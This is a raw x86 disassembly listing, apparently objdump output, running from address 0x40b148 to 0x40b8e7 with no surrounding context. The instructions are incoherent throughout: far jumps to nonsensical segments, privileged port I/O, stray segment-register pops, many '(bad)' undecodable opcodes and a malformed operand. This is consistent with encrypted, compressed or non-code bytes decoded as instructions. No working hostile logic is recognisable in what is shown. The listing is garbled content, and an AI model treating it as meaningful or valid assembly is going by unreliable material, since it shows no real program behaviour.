  40b148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b149:	dec    edx
  40b14a:	pop    ds
  40b14b:	mov    cl,0xd0
  40b14d:	add    ebx,DWORD PTR [edx]
  40b14f:	push   edi
  40b150:	jno    0x40b121
  40b152:	dec    ebx
  40b153:	aad    0xda
  40b155:	lahf   
  40b156:	aas    
  40b157:	sbb    al,0x82
  40b159:	adc    eax,0x9e738ca7
  40b15e:	adc    DWORD PTR [ebp+0x57],esi
  40b161:	push   eax
  40b162:	xchg   esi,eax
  40b163:	mov    bl,0xe7
  40b165:	(bad)  
  40b166:	shl    BYTE PTR [ebp-0x1e],cl
  40b169:	(bad)  
  40b16b:	mov    eax,0x4825eb38
  40b170:	pop    ebx
  40b171:	shl    BYTE PTR [edx+0x58060ceb],cl
  40b177:	jne    0x40b159
  40b179:	or     ah,bl
  40b17b:	inc    ebx
  40b17c:	(bad)  
  40b17e:	fsub   QWORD PTR [esi+0x57]
  40b181:	inc    ecx
  40b182:	rcr    edi,0x71
  40b185:	pushf  
  40b186:	sbb    BYTE PTR [edi],ch
  40b188:	jg     0x40b11c
  40b18a:	mov    DWORD PTR [edi+0xdb92117],esi
  40b190:	gs push esp
  40b192:	lds    edi,FWORD PTR [ecx]
  40b194:	jnp    0x40b1a1
  40b196:	mov    eax,0xbc5638ec
  40b19b:	inc    esi
  40b19c:	xor    al,0xa9
  40b19e:	mov    DWORD PTR ds:0x75243493,ebp
  40b1a4:	adc    bl,BYTE PTR [edi]
  40b1a6:	xlat   BYTE PTR ds:[ebx]
  40b1a7:	ins    DWORD PTR es:[edi],dx
  40b1a8:	jmp    0x4354:0x7115315a
  40b1af:	sbb    al,0x34
  40b1b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1b2:	jle    0x40b170
  40b1b4:	in     eax,dx
  40b1b5:	pop    ds
  40b1b6:	mov    dh,0x3a
  40b1b8:	imul   al
  40b1ba:	rol    edi,cl
  40b1bc:	mov    BYTE PTR [eax+0x54d35cd5],dl
  40b1c2:	cmp    al,0xcc
  40b1c4:	and    edi,DWORD PTR [eax+0x23bb78cb]
  40b1ca:	push   edi
  40b1cb:	sub    ecx,ebp
  40b1cd:	fwait
  40b1ce:	jne    0x40b16d
  40b1d0:	popf   
  40b1d1:	cs aad 0xb
  40b1d4:	scas   al,BYTE PTR es:[edi]
  40b1d5:	and    ah,BYTE PTR [esi+eiz*8]
  40b1d8:	inc    edi
  40b1d9:	out    dx,eax
  40b1da:	mov    ebx,0x87f0e7c5
  40b1df:	ja     0x40b1d5
  40b1e1:	xor    esi,DWORD PTR [ecx+0x58]
  40b1e4:	sub    al,0xd
  40b1e6:	push   esi
  40b1e7:	or     al,0x97
  40b1e9:	fcomip st,st(3)
  40b1eb:	xchg   ebp,eax
  40b1ec:	jb     0x40b19d
  40b1ee:	out    0x11,al
  40b1f0:	int3   
  40b1f1:	test   DWORD PTR [edi],ebp
  40b1f3:	pushf  
  40b1f4:	imul   ebp,esi,0x28cb008
  40b1fa:	push   esi
  40b1fb:	mov    ah,0x14
  40b1fd:	ins    DWORD PTR es:[edi],dx
  40b1fe:	pop    ebx
  40b1ff:	aam    0x5b
  40b201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b202:	aad    0x71
  40b204:	jge    0x40b23a
  40b206:	ins    BYTE PTR es:[edi],dx
  40b207:	sub    eax,DWORD PTR [edi+0x158da40e]
  40b20d:	cmp    ebx,DWORD PTR ds:0xd6141bf1
  40b213:	cdq    
  40b214:	leave  
  40b215:	inc    ecx
  40b216:	sub    BYTE PTR [esi],bl
  40b218:	adc    eax,DWORD PTR [edx]
  40b21a:	popf   
  40b21b:	jne    0x40b26c
  40b21d:	mov    DWORD PTR [ecx],edi
  40b21f:	add    eax,0x1469fa70
  40b224:	jno    0x40b25c
  40b226:	cld    
  40b227:	int3   
  40b228:	inc    edi
  40b229:	(bad)  
  40b22a:	mul    BYTE PTR [edx+0x5c9c1fd0]
  40b230:	lods   eax,DWORD PTR ds:[esi]
  40b231:	dec    esp
  40b232:	mov    ah,0x37
  40b234:	mov    esp,0x188cd604
  40b239:	rol    DWORD PTR [edx-0x6f267fd4],0x75
  40b240:	push   0x67
  40b242:	outs   dx,DWORD PTR ds:[esi]
  40b243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b244:	fidivr DWORD PTR [edx+0x5a]
  40b247:	adc    esp,DWORD PTR [ebp-0x7e]
  40b24a:	aad    0xc1
  40b24c:	test   al,0x63
  40b24e:	xchg   ecx,eax
  40b24f:	dec    ecx
  40b250:	xor    eax,0xcfeefccd
  40b255:	ds push ebx
  40b257:	fsubr  DWORD PTR [edx-0x153905e1]
  40b25d:	push   eax
  40b25e:	xlat   BYTE PTR ds:[ebx]
  40b25f:	scas   eax,DWORD PTR es:[edi]
  40b260:	jno    0x40b298
  40b262:	inc    BYTE PTR [ebp+0x39]
  40b265:	inc    edx
  40b266:	jne    0x40b22a
  40b268:	push   ebx
  40b269:	and    BYTE PTR [edi-0x21],al
  40b26c:	sbb    ebp,edx
  40b26e:	ss pop ebx
  40b270:	xor    eax,0xd3ece7d3
  40b275:	dec    edi
  40b276:	aad    0x5d
  40b278:	(bad)  [edi]
  40b27a:	mov    al,ds:0xac1fda6e
  40b27f:	dec    DWORD PTR ds:[ebx+0x45]
  40b283:	or     eax,0x19d5c9ec
  40b288:	or     bl,dl
  40b28a:	push   si
  40b28c:	in     eax,dx
  40b28d:	and    DWORD PTR [ebp-0x6466738b],ebp
  40b293:	call   0xa690:0xafab713d
  40b29a:	int3   
  40b29b:	and    BYTE PTR [ecx],dh
  40b29d:	cmp    BYTE PTR [edi-0x26d3636],dh
  40b2a3:	je     0x40b2e0
  40b2a5:	inc    ecx
  40b2a6:	out    dx,eax
  40b2a7:	out    0x31,al
  40b2a9:	mov    esp,0x5974bf0b
  40b2ae:	jg     0x40b2c0
  40b2b0:	and    eax,0xb95cdb43
  40b2b5:	popa   
  40b2b6:	mov    bl,0x75
  40b2b8:	jmp    0x40b327
  40b2ba:	das    
  40b2bb:	add    BYTE PTR es:0x1ce8851e,ah
  40b2c2:	(bad)  
  40b2c3:	lods   al,BYTE PTR ds:[esi]
  40b2c4:	bound  edi,QWORD PTR [edx+0x530f9c6a]
  40b2ca:	mov    dh,0x75
  40b2cc:	or     ch,BYTE PTR [eax]
  40b2ce:	push   esi
  40b2cf:	stc    
  40b2d0:	adc    al,0xf8
  40b2d2:	rol    BYTE PTR [ecx+ebp*4+0x65],0xae
  40b2d7:	clc    
  40b2d8:	daa    
  40b2d9:	and    edx,DWORD PTR [ebx+0x6323034b]
  40b2df:	push   cs
  40b2e0:	jmp    0x22ef833
  40b2e5:	dec    ebp
  40b2e6:	lods   al,BYTE PTR ds:[esi]
  40b2e7:	aam    0x71
  40b2e9:	mov    al,ds:0xbb5c6c5a
  40b2ee:	mov    ecx,?
  40b2f0:	mov    dl,0x1f
  40b2f2:	push   ds
  40b2f3:	and    DWORD PTR [edx+0x42b85b93],0x25bd521
  40b2fd:	xor    DWORD PTR [ebp+ebx*4+0x751b4bd7],0xffffffd3
  40b305:	fild   QWORD PTR [eax+0x69]
  40b308:	fs push 0x21801ba1
  40b30e:	mov    ebp,0x9bf9c26
  40b313:	cld    
  40b314:	std    
  40b315:	daa    
  40b316:	call   0xe525d88f
  40b31b:	jne    0x40b2d6
  40b31d:	jmp    0xc1db:0xf67ce6ae
  40b324:	dec    esp
  40b325:	mov    al,ds:0xce7cd489
  40b32a:	mov    dh,0x78
  40b32c:	xchg   ebp,eax
  40b32d:	adc    BYTE PTR [ecx+0x6df3aefb],dl
  40b333:	jge    0x40b2b6
  40b335:	mov    dl,0xd5
  40b337:	in     eax,0x8f
  40b339:	mov    edx,0xf8180458
  40b33e:	sbb    dh,BYTE PTR [ebp+0x39]
  40b341:	in     eax,dx
  40b342:	add    eax,0x92d5e869
  40b347:	mov    dl,0xac
  40b349:	and    DWORD PTR [ebx-0x8c84f8b],edi
  40b34f:	dec    ebx
  40b350:	pop    ss
  40b351:	dec    eax
  40b352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b353:	jne    0x40b368
  40b355:	jno    0x40b3c8
  40b357:	push   0xcb640466
  40b35c:	mov    ss,edx
  40b35e:	push   esi
  40b35f:	cwde   
  40b360:	icebp  
  40b361:	xchg   BYTE PTR ds:0xa9e63da4,cl
  40b367:	scas   al,BYTE PTR es:[edi]
  40b368:	sbb    DWORD PTR [ebp+0x24cdda55],ebp
  40b36e:	sub    eax,0xd5b20c57
  40b373:	outs   dx,BYTE PTR ds:[esi]
  40b374:	mov    dh,0x18
  40b376:	cwde   
  40b377:	fidiv  WORD PTR [ebx-0x3835c74]
  40b37d:	lods   al,BYTE PTR ds:[esi]
  40b37e:	gs data16 mov al,0x4a
  40b382:	fs sub ch,ch
  40b385:	pop    ds
  40b386:	adc    DWORD PTR [edi+0xa235514],esp
  40b38c:	jno    0x40b400
  40b38e:	and    al,0x96
  40b390:	jp     0x40b33f
  40b392:	cmp    ah,BYTE PTR [edi-0x7f]
  40b395:	pop    ds
  40b396:	inc    ecx
  40b397:	fisubr WORD PTR [edi]
  40b399:	add    DWORD PTR [ebp-0x2a0e1017],esp
  40b39f:	aas    
  40b3a0:	stc    
  40b3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3a2:	cmc    
  40b3a3:	cmp    eax,0x83fa8a45
  40b3a8:	adc    cl,BYTE PTR [ebx+0xf7151b0]
  40b3ae:	mov    ah,0x6b
  40b3b0:	mov    ds:0xda66d5c3,al
  40b3b5:	popf   
  40b3b6:	lods   eax,DWORD PTR ds:[esi]
  40b3b7:	or     esi,DWORD PTR [ebx+0x42]
  40b3ba:	outs   dx,DWORD PTR ds:[esi]
  40b3bb:	jne    0x40b3f2
  40b3bd:	shl    esi,0xf8
  40b3c0:	imul   ebp,DWORD PTR [ebx-0x50124252],0xffffffd5
  40b3c7:	sub    eax,0xc5e956f7
  40b3cc:	sub    BYTE PTR [ebx-0x42487ca9],0x27
  40b3d3:	sbb    cl,BYTE PTR [ecx]
  40b3d5:	mov    edx,0x6271b91e
  40b3da:	stos   DWORD PTR es:[edi],eax
  40b3db:	es or  cl,BYTE PTR gs:[ebp-0x4d]
  40b3e0:	and    eax,0xb17540d0
  40b3e5:	push   esi
  40b3e6:	cdq    
  40b3e7:	add    al,0x37
  40b3e9:	mov    ds:0x4bb99034,al
  40b3ee:	jbe    0x40b465
  40b3f0:	sbb    BYTE PTR [edx],0xf5
  40b3f3:	pop    ebx
  40b3f4:	mov    edx,0x33842c53
  40b3f9:	cwde   
  40b3fa:	mov    eax,ds:0x982fb48b
  40b3ff:	mov    bh,0x51
  40b401:	clc    
  40b402:	and    BYTE PTR [ecx],ah
  40b404:	jno    0x40b400
  40b406:	and    eax,0xea9d90e9
  40b40b:	push   edx
  40b40c:	inc    ebx
  40b40d:	das    
  40b40e:	fmul   st,st(6)
  40b410:	cmp    bh,cl
  40b412:	xchg   edx,eax
  40b413:	cmc    
  40b414:	test   BYTE PTR [esi+ecx*1],bh
  40b417:	push   esp
  40b418:	push   esi
  40b419:	cmc    
  40b41a:	fadd   st,st(6)
  40b41c:	mov    WORD PTR [esi],es
  40b41e:	out    dx,al
  40b41f:	retf   
  40b420:	dec    ecx
  40b421:	adc    ecx,eax
  40b423:	ins    DWORD PTR es:[edi],dx
  40b424:	aad    0x8
  40b426:	push   ds
  40b427:	jbe    0x40b469
  40b429:	adc    al,0x49
  40b42b:	jg     0x40b44e
  40b42d:	jle    0x40b45f
  40b42f:	inc    ebp
  40b430:	pop    esp
  40b431:	mov    ss,ebp
  40b433:	sbb    eax,0x94b3d73d
  40b438:	xor    eax,0xa7919edb
  40b43d:	mov    bh,0x79
  40b43f:	mov    ss:0x8d12115d,eax
  40b445:	fbld   TBYTE PTR [esi-0x3]
  40b448:	jno    0x40b44c
  40b44a:	xlat   BYTE PTR ds:[ebx]
  40b44b:	mov    edi,0x95e24a49
  40b450:	neg    BYTE PTR ds:0x1fb56920
  40b456:	mul    DWORD PTR [esi]
  40b458:	cdq    
  40b459:	(bad)  
  40b45a:	sbb    edx,DWORD PTR [eax]
  40b45c:	enter  0xd597,0xd0
  40b460:	jmp    0x40b453
  40b462:	mov    dh,0xa5
  40b464:	loope  0x40b44e
  40b466:	jecxz  0x40b4dc
  40b468:	sub    bl,dh
  40b46a:	shl    DWORD PTR [edx-0x759108d1],cl
  40b470:	jno    0x40b436
  40b472:	cwde   
  40b473:	add    al,0xc3
  40b475:	jecxz  0x40b482
  40b477:	pop    ds
  40b478:	pop    ebx
  40b479:	and    BYTE PTR [esp+edx*4-0x69],ch
  40b47d:	pop    ss
  40b47e:	imul   ecx,ebp,0xffffffcb
  40b481:	dec    edi
  40b482:	aad    0xf
  40b484:	jbe    0x40b4c3
  40b486:	test   BYTE PTR ss:[edx],cl
  40b489:	sahf   
  40b48a:	jge    0x40b501
  40b48c:	das    
  40b48d:	int    0x21
  40b48f:	cmp    eax,0xa8fd6d09
  40b494:	jno    0x40b494
  40b496:	mov    al,0x5d
  40b498:	cli    
  40b499:	lock push 0x4f1fef9c
  40b49f:	test   cl,bl
  40b4a1:	push   eax
  40b4a2:	inc    eax
  40b4a3:	imul   eax,DWORD PTR [ecx],0xffffffdd
  40b4a6:	mov    edi,0x48f671bc
  40b4ab:	ficom  WORD PTR [ebp-0x4851fb3]
  40b4b1:	sbb    DWORD PTR [ebp+esi*2-0x77],ebx
  40b4b5:	xchg   BYTE PTR [eax+eiz*2+0x1d],al
  40b4b9:	in     al,dx
  40b4ba:	sbb    BYTE PTR [eax+0x71],0xe7
  40b4be:	pusha  
  40b4bf:	cmc    
  40b4c0:	or     edi,DWORD PTR [esi+0x4c]
  40b4c3:	adc    dl,BYTE PTR [edi+0x6bd6fd1f]
  40b4c9:	add    DWORD PTR [edi+0x59],esi
  40b4cc:	xchg   esi,eax
  40b4cd:	(bad)  
  40b4ce:	aad    0xc5
  40b4d0:	repz add al,0xae
  40b4d3:	retf   0xefa0
  40b4d6:	inc    edi
  40b4d7:	jl     0x40b4a4
  40b4d9:	xor    eax,0xd09d19ac
  40b4de:	(bad)  
  40b4df:	loope  0x40b4ae
  40b4e1:	jecxz  0x40b46c
  40b4e3:	shl    DWORD PTR [ebx+ebx*1+0x56],0xba
  40b4e8:	inc    edx
  40b4e9:	mov    ch,0x5e
  40b4eb:	sub    eax,0x75155665
  40b4f0:	add    eax,0x7e4c8667
  40b4f5:	cwde   
  40b4f6:	mov    BYTE PTR [ebx],dh
  40b4f8:	leave  
  40b4f9:	(bad)  
  40b4fa:	fdiv   DWORD PTR [edi+0x7d]
  40b4fd:	ss mov cl,0xb7
  40b500:	inc    esi
  40b501:	rol    DWORD PTR [ecx+edx*4+0x75102a49],0xb7
  40b509:	jmp    0x40b502
  40b50b:	out    dx,al
  40b50c:	imul   esp,DWORD PTR [edi],0xa17158ca
  40b512:	pop    eax
  40b513:	or     cl,BYTE PTR [ebx-0x17c4ffaa]
  40b519:	pop    ds
  40b51a:	jl     0x40b4a7
  40b51c:	push   0xffffff82
  40b51e:	sub    DWORD PTR ds:0xadd59bd7,ebp
  40b524:	xchg   edi,eax
  40b525:	clc    
  40b526:	(bad)  
  40b527:	cmp    DWORD PTR [edi+ebx*1+0x57],ebp
  40b52b:	or     eax,0x74ddd021
  40b530:	fist   DWORD PTR [ebx-0x123b2b8f]
  40b536:	or     DWORD PTR [ecx+0x76324472],eax
  40b53c:	pop    ds
  40b53d:	mov    esp,DWORD PTR [ecx]
  40b53f:	sti    
  40b540:	xchg   ecx,eax
  40b541:	inc    eax
  40b542:	mov    al,0x75
  40b544:	in     eax,dx
  40b545:	fcmovne st,st(2)
  40b547:	rcl    BYTE PTR [esi+eiz*8+0x75],0x6c
  40b54c:	jno    0x40b4e2
  40b54e:	sti    
  40b54f:	clc    
  40b550:	test   eax,0xb0928871
  40b555:	iret   
  40b556:	ins    BYTE PTR es:[edi],dx
  40b557:	mov    WORD PTR [edi-0x188ae624],gs
  40b55d:	aas    
  40b55e:	sar    DWORD PTR [ebp+0x60],cl
  40b561:	mov    bh,0xd8
  40b563:	or     eax,0x8085724e
  40b568:	jg     0x40b544
  40b56a:	push   0x68
  40b56c:	jbe    0x40b525
  40b56e:	xchg   ebp,eax
  40b56f:	and    edx,esi
  40b571:	cmp    eax,DWORD PTR [edi]
  40b573:	clc    
  40b574:	add    ah,BYTE PTR [eax-0x304a4b79]
  40b57a:	(bad)  
  40b57c:	jno    0x40b517
  40b57e:	bound  eax,QWORD PTR [esi-0x1a072385]
  40b584:	fs cmp eax,0x20309b1c
  40b58a:	or     ah,BYTE PTR [ecx-0x40]
  40b58d:	push   eax
  40b58e:	or     BYTE PTR [esi+0x71],ch
  40b591:	test   al,0xfe
  40b593:	jo     0x40b5db
  40b595:	xchg   ebx,eax
  40b596:	dec    ebp
  40b597:	pop    esp
  40b598:	int3   
  40b599:	pop    ds
  40b59a:	fsub   st(1),st
  40b59c:	jae    0x40b5d7
  40b59e:	and    eax,0xd6047ac7
  40b5a3:	pop    ss
  40b5a4:	xor    ebp,edx
  40b5a6:	lea    edx,[edi]
  40b5a8:	clc    
  40b5a9:	frstor [esi*2-0x54e57f94]
  40b5b0:	jnp    0x40b5cf
  40b5b2:	aas    
  40b5b3:	fmul   DWORD PTR [esi-0x4ded3275]
  40b5b9:	inc    ebp
  40b5ba:	lock or al,dh
  40b5bd:	mov    edx,0x20021d35
  40b5c2:	sub    BYTE PTR [ebx],bl
  40b5c4:	jnp    0x40b5ee
  40b5c6:	push   edx
  40b5c7:	imul   ebx,DWORD PTR [eax+0x56],0x8298b5d5
  40b5ce:	in     al,dx
  40b5cf:	dec    edi
  40b5d0:	mov    ds:0x1975985a,al
  40b5d5:	out    dx,eax
  40b5d6:	(bad)  [ecx+0xc27db80]
  40b5dc:	jb     0x40b59a
  40b5de:	push   edx
  40b5df:	scas   eax,DWORD PTR es:[edi]
  40b5e0:	in     al,0xf
  40b5e2:	jge    0x40b58d
  40b5e4:	push   ebp
  40b5e5:	mov    edi,0xe466756b
  40b5ea:	inc    ebp
  40b5eb:	or     ebx,ecx
  40b5ed:	cs mov esi,0xcbf871f7
  40b5f3:	jle    0x40b611
  40b5f5:	repnz and edi,DWORD PTR [ebp-0x7ec0dfc2]
  40b5fc:	sbb    ebp,ecx
  40b5fe:	hlt    
  40b5ff:	dec    ecx
  40b600:	add    al,0xe7
  40b602:	in     al,0x7c
  40b604:	enter  0x1515,0xd5
  40b608:	add    eax,0xa928288c
  40b60d:	pop    ds
  40b60e:	cld    
  40b60f:	ss or  eax,0x842a3d5b
  40b615:	scas   eax,DWORD PTR es:[edi]
  40b616:	in     al,0x40
  40b618:	push   edx
  40b619:	gs mov al,0x95
  40b61c:	push   cs
  40b61d:	jbe    0x40b651
  40b61f:	xor    al,ah
  40b621:	pop    ds
  40b622:	in     al,0x5f
  40b624:	jmp    0xd5a4:0x7548dff4
  40b62b:	xor    ebp,DWORD PTR [eax+0x7c]
  40b62e:	out    dx,al
  40b62f:	xchg   esp,eax
  40b630:	mov    bh,0xf1
  40b632:	pusha  
  40b633:	jne    0x40b5fb
  40b635:	adc    eax,ebx
  40b637:	sbb    esi,ebp
  40b639:	ror    edi,0x37
  40b63c:	jno    0x40b683
  40b63e:	add    eax,0x69ff5373
  40b643:	pop    esp
  40b644:	mov    eax,0x77751a13
  40b649:	sub    DWORD PTR [ebx],esi
  40b64b:	or     eax,0x337a9c56
  40b650:	jecxz  0x40b683
  40b652:	aad    0x9e
  40b654:	sahf   
  40b655:	sar    DWORD PTR [edi-0x7b003748],1
  40b65b:	js     0x40b5ff
  40b65d:	fdiv   st,st(0)
  40b65f:	pop    ss
  40b660:	push   eax
  40b661:	out    dx,eax
  40b662:	test   DWORD PTR [ecx-0x73b3e2fa],edx
  40b668:	jno    0x40b61d
  40b66a:	xchg   cl,al
  40b66c:	jp     0x40b65b
  40b66e:	ja     0x40b607
  40b670:	pop    edx
  40b671:	and    BYTE PTR [ecx-0x583c4e3c],dl
  40b677:	fisttp WORD PTR [edx-0x3e4c2a37]
  40b67d:	mov    edi,0xef822a50
  40b682:	jbe    0x40b6f9
  40b684:	xor    ecx,ebx
  40b686:	push   ds
  40b687:	loop   0x40b636
  40b689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b68a:	and    dh,bh
  40b68c:	jno    0x40b620
  40b68e:	imul   cx,WORD PTR [ecx-0x46],0x8bba
  40b694:	mov    bl,0x22
  40b696:	cmp    al,0x3b
  40b698:	cmp    esi,eax
  40b69a:	jl     0x40b698
  40b69c:	xor    ch,BYTE PTR [esi+0x53]
  40b69f:	imul   edi,DWORD PTR [eax],0xb2ded53f
  40b6a5:	stos   BYTE PTR es:[edi],al
  40b6a6:	(bad)  
  40b6a7:	out    dx,eax
  40b6a8:	add    ebx,DWORD PTR [eax-0x21a8a4f]
  40b6ae:	pop    ebx
  40b6af:	adc    eax,0xb561c3e7
  40b6b4:	or     DWORD PTR [edi],esi
  40b6b6:	(bad)  
  40b6b7:	sbb    DWORD PTR [eax],edx
  40b6b9:	jmp    0x30f4c75f
  40b6be:	cdq    
  40b6bf:	mov    dl,0x8d
  40b6c1:	pop    ds
  40b6c2:	les    ebx,FWORD PTR [ebp+0x1e]
  40b6c5:	sbb    al,BYTE PTR [ebx-0x23]
  40b6c8:	xlat   BYTE PTR ds:[ebx]
  40b6c9:	sub    ebp,edx
  40b6cb:	std    
  40b6cc:	adc    edi,edi
  40b6ce:	inc    ebp
  40b6cf:	push   esi
  40b6d0:	jae    0x40b715
  40b6d2:	shl    bl,0x97
  40b6d5:	pop    ds
  40b6d6:	aas    
  40b6d7:	mov    bl,0x75
  40b6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6da:	jns    0x40b67e
  40b6dc:	push   ebp
  40b6dd:	adc    dh,dl
  40b6df:	inc    ecx
  40b6e0:	jl     0x40b68c
  40b6e2:	cld    
  40b6e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6e4:	jmp    0x40b73c
  40b6e6:	xor    dh,BYTE PTR [ebp-0x26]
  40b6e9:	hlt    
  40b6ea:	pop    es
  40b6eb:	bound  eax,QWORD PTR [edx+0x719b20ee]
  40b6f1:	in     eax,dx
  40b6f2:	add    al,0x63
  40b6f4:	sbb    BYTE PTR [ebx+0x71],ah
  40b6f7:	or     edx,ebx
  40b6f9:	pop    ds
  40b6fa:	scas   al,BYTE PTR es:[edi]
  40b6fb:	and    BYTE PTR [edx],bh
  40b6fd:	cmp    al,0xf6
  40b6ff:	push   ebp
  40b700:	popf   
  40b701:	les    ecx,FWORD PTR [edx+0x6e]
  40b704:	sub    cl,0xa3
  40b707:	shl    BYTE PTR [edx],cl
  40b709:	(bad)  
  40b70a:	adc    eax,0x624db734
  40b70f:	or     eax,DWORD PTR [edx-0xaf990d3]
  40b715:	shl    DWORD PTR [esi],cl
  40b717:	(bad)  
  40b718:	(bad)  [edi-0x375e9a8f]
  40b71e:	sar    DWORD PTR [ecx],1
  40b720:	jecxz  0x40b756
  40b722:	adc    esp,DWORD PTR [esp+ebx*1+0x43608520]
  40b729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b72a:	les    esp,FWORD PTR [esi+0x78]
  40b72d:	pop    ds
  40b72e:	popf   
  40b72f:	(bad)  
  40b730:	jmp    0x3f3063f4
  40b735:	xchg   al,bl
  40b737:	dec    eax
  40b738:	mov    dl,0x4a
  40b73a:	mov    dh,0x13
  40b73c:	loope  0x40b70d
  40b73e:	bound  edi,QWORD PTR [ecx+0x38ec205e]
  40b744:	rcl    BYTE PTR [ebx+0x1a9278f8],cl
  40b74a:	(bad)  
  40b74b:	es iret 
  40b74d:	push   cs
  40b74e:	lods   al,BYTE PTR ds:[esi]
  40b74f:	xor    eax,0x7597574e
  40b754:	cmp    dl,bh
  40b756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b757:	scas   eax,DWORD PTR es:[edi]
  40b758:	sbb    BYTE PTR [edx-0x118b20c0],bh
  40b75e:	or     eax,0xcbfb32ec
  40b763:	jl     0x40b7e2
  40b765:	add    edx,DWORD PTR [edx-0x27]
  40b768:	shl    BYTE PTR cs:[esi-0x1b60a95e],0xa9
  40b770:	mov    ds:0x23f4f99a,eax
  40b775:	xchg   esp,eax
  40b776:	ret    
  40b777:	call   0x1cb9d740
  40b77c:	icebp  
  40b77d:	push   ebp
  40b77e:	inc    ebp
  40b77f:	sbb    BYTE PTR [eax+0x3ebfd619],cl
  40b785:	push   edi
  40b786:	lds    esi,FWORD PTR [esi+0x30]
  40b789:	mov    edx,0x3d997550
  40b78e:	test   eax,0xe789ea62
  40b793:	jmp    0x75e8:0x722f3871
  40b79a:	mov    bh,0x1e
  40b79c:	stos   BYTE PTR es:[edi],al
  40b79d:	add    eax,0xe8297531
  40b7a2:	or     eax,0x6e20ebb1
  40b7a7:	push   DWORD PTR [ecx-0x14]
  40b7aa:	neg    BYTE PTR [edx+0x1ef7fd7e]
  40b7b0:	nop
  40b7b1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40b7b3:	mov    esi,0x25d5f037
  40b7b8:	popa   
  40b7b9:	js     0x40b7d3
  40b7bb:	fs jno 0x40b800
  40b7be:	sbb    eax,0xd6d1e879
  40b7c3:	sbb    ecx,0xe0a5ea22
  40b7c9:	loop   0x40b7a6
  40b7cb:	mov    edi,0x5c6b4701
  40b7d0:	(bad)  
  40b7d1:	call   0x70f27510
  40b7d6:	loope  0x40b812
  40b7d8:	pop    edx
  40b7d9:	xor    eax,0xeb1274f9
  40b7de:	xor    eax,0x790cabcb
  40b7e3:	call   0xaa0f:0x94d5896f
  40b7ea:	mov    eax,ds:0x2ad1a2f5
  40b7ef:	mov    bl,0x11
  40b7f1:	loop   0x40b7e7
  40b7f3:	add    eax,0x2bd61cde
  40b7f8:	cli    
  40b7f9:	sbb    BYTE PTR [edi-0x22],dh
  40b7fc:	dec    edi
  40b7fd:	aam    0xd5
  40b7ff:	bound  edx,QWORD PTR [ebx+0x1d]
  40b802:	dec    ecx
  40b803:	imul   edx,DWORD PTR [eax-0x1c],0xffffffc4
  40b807:	ja     0x40b80e
  40b809:	mov    al,ds:0x876f8ae3
  40b80e:	adc    eax,0xbd880859
  40b813:	js     0x40b886
  40b815:	fild   QWORD PTR [eax+0x7bb8e12a]
  40b81b:	lea    ebx,[ebp+0x2f]
  40b81e:	sbb    al,0xa4
  40b820:	sub    eax,DWORD PTR [eax-0xf8743ec]
  40b826:	push   esp
  40b827:	xchg   ebp,eax
  40b828:	leave  
  40b829:	mov    ch,0xa
  40b82b:	bnd je 0x40b813
  40b82e:	pusha  
  40b82f:	repz in eax,0x55
  40b832:	xor    eax,0x218d6045
  40b837:	cmp    DWORD PTR [edx],0x22
  40b83a:	dec    ebp
  40b83b:	and    cl,dl
  40b83d:	xchg   BYTE PTR [edi-0x2ac0ee27],dh
  40b843:	ss push ds
  40b845:	jg     0x40b7d2
  40b847:	dec    esp
  40b848:	jbe    0x40b8b6
  40b84a:	ins    BYTE PTR es:[edi],dx
  40b84b:	jne    0x40b7ed
  40b84d:	in     al,dx
  40b84e:	ret    
  40b84f:	repz imul eax,DWORD PTR [ebp+0x7b],0x4f
  40b854:	(bad)  
  40b855:	aam    0xc7
  40b857:	push   ebx
  40b858:	mov    eax,0x84554161
  40b85d:	mov    bh,0x3e
  40b85f:	gs inc esp
  40b861:	mov    bh,BYTE PTR [edi-0x4412663b]
  40b867:	jne    0x40b85b
  40b869:	call   0xc3caf1f1
  40b86e:	sbb    BYTE PTR [edi],bl
  40b870:	jno    0x40b8ca
  40b872:	icebp  
  40b873:	ins    BYTE PTR es:[edi],dx
  40b874:	(bad)  
  40b876:	adc    cl,BYTE PTR [eax+edi*2+0x20]
  40b87a:	cwde   
  40b87b:	cmc    
  40b87c:	jbe    0x40b878
  40b87e:	mov    ah,0x11
  40b880:	(bad)  
  40b881:	adc    ebx,DWORD PTR [ebx+0x736c71d9]
  40b887:	inc    edi
  40b888:	int    0x51
  40b88a:	popf   
  40b88b:	jb     0x40b823
  40b88d:	pop    ds
  40b88e:	(bad)  
  40b88f:	add    eax,DWORD PTR [edx+0x7e]
  40b892:	sub    BYTE PTR ds:0xccd52921,dh
  40b898:	jo     0x40b871
  40b89a:	pop    ss
  40b89b:	xor    al,0x54
  40b89d:	dec    ecx
  40b89e:	mov    esi,DWORD PTR [ebp+0x34]
  40b8a1:	sub    eax,0x24035c29
  40b8a6:	and    DWORD PTR [ebx],0xba7fbd71
  40b8ac:	mov    ch,0xbc
  40b8ae:	pop    ebx
  40b8af:	loope  0x40b8d6
  40b8b1:	shl    DWORD PTR [ebx+0x35],0xe1
  40b8b5:	push   ds
  40b8b6:	outs   dx,DWORD PTR ds:[esi]
  40b8b7:	imul   ebp,ecx,0x303cf74d
  40b8bd:	and    bl,dh
  40b8bf:	mov    ebx,0x8f0d9c77
  40b8c4:	jno    0x40b879
  40b8c6:	dec    edx
  40b8c7:	fisub  WORD PTR [ebp+0x1b]
  40b8ca:	je     0x40b8dd
  40b8cc:	adc    esp,DWORD PTR [eax]
  40b8ce:	enter  0x7d19,0xda
  40b8d2:	mov    ds:0x4d3dcf7c,al
  40b8d7:	mov    dl,0x71
  40b8d9:	popf   
  40b8da:	add    edx,DWORD PTR [esi-0x3e]
  40b8dd:	js     0x40b927
  40b8df:	jge    0x40b90f
  40b8e1:	and    BYTE PTR [edi+0x50e8e52c],dl
  40b8e7:	scas   eax,DWORD PTR es:[edi]
